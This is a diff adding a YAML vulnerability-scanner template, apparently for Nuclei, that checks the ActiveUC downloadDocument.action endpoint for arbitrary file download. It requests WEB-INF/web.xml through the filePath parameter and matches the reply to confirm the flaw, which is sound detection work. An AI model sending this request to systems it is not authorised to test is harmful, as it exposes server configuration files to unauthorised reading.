@@ -1,0 +1,30 @@
+id: active-downloaddocument-action-anyfile-download
+info:
+  name: ActiveUC downloadDocument.action Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in ActiveUC downloadDocument.action endpoint allows arbitrary file download by manipulating the filePath parameter.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<filter-name>"
+          - "web-app"
+      - type: word
+        part: header
+        words:
+          - "filename=web.xml"
+      - type: word
+        part: header
+        words:
+          - "application/x-download"
